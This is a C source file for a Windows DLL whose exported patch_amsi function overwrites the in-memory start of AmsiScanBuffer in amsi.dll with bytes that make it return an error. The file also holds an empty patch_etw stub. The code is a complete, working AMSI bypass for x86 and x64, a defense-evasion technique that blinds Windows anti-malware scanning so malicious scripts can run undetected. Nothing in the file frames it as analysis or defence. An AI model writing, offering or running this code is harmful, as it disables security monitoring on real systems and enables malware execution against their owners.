// cl.exe /D_USRDLL /D_WINDLL patcher.c /MT /link /DLL /OUT:patcher.dll
#include <Windows.h>
#include <windef.h>
#include "patcher.h"
#include "rewrite.h"
#include "userfuncs.h"
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE _hModule,  DWORD  ul_reason_for_call, LPVOID _lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}


EXPORT int WINAPI patch_amsi() {
  #if defined(_M_X64)
    printf("[i] Architecture\t\tx86_64\n");
    // https://defuse.ca/online-x86-assembler.htm#disassembly
    // xor eax, eax
    // mov eax, 0x11111111
    // xor eax, 0x91161146
    // ret
    unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC3 };
  #elif defined(_M_IX86) || defined(__i386__)
      printf("[i] Architecture\tx86\n");
      // xor eax, eax
      // mov eax, 0x11111111
      // xor eax, 0x91161146
      // ret 0x18
      unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC2, 0x18, 0x00 };
  #else
      fprintf(stderr, "[!] Unsupported Architecture!\n");
      return -1;
  #endif

  printf("[i] Payload to write\t\t");
  phex(patch_bytes, (int)(sizeof(patch_bytes)/sizeof(patch_bytes[0])));

  HMODULE amsi_dll_handle = LoadLibrary("amsi.dll");
  if (NULL == amsi_dll_handle) {
      fprintf(stderr, "[!] Failed to load amsi.dll(Error Code: %d)\n", GetLastError());
      return -2;
  }

  FARPROC amsi_scan_buffer_base_addr = GetProcAddress(amsi_dll_handle, "AmsiScanBuffer");
  if (NULL == amsi_scan_buffer_base_addr) {
      fprintf(stderr, "[!] Failed to get base address of AmsiScanBuffer(Error Code: %d)\n", GetLastError());
      return -3;
  }

  printf("[i] AmsiScanBuffer Offset\t0x%p\n", amsi_scan_buffer_base_addr);
  DWORD oldprotect;
  BOOL _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                              sizeof(patch_bytes),
                              PAGE_READWRITE,
                              &oldprotect);
  if (!_vp){
      fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
      return -2;
  }

  memcpy(amsi_scan_buffer_base_addr, patch_bytes, sizeof(patch_bytes));

  DWORD _temp;
  _vp = VirtualProtect((LPVOID)amsi_scan_buffer_base_addr,
                              sizeof(patch_bytes),
                              oldprotect,
                              &_temp);

  if (!_vp){
      fprintf(stderr, "[!] VirtualProtect Failed(Error Code: %d)\n", GetLastError());
      return -3;
  }
  return 0;
}

EXPORT int WINAPI patch_etw(){
  return 0;
}
   